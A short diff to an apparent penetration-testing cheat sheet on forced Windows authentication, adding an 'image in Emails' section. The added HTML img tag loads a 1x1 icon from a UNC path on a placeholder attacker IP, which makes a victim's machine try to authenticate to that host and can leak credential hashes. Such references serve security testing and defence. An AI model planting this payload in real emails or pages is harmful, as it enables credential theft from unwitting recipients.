@@ -91,7 +91,12 @@ IconIndex=1
 </searchConnectorDescription>
 ```
 
-- For other filetypes check out the tools listed
+#### 1x1 image in Emails
+```
+<img src="\\<IP>\test.ico" height="1" width="1" />
+```
+
+#### For other filetypes check out the tools listed
 
 ### Force authentication
 #### Trigger target computer to authenticate to attacker machine
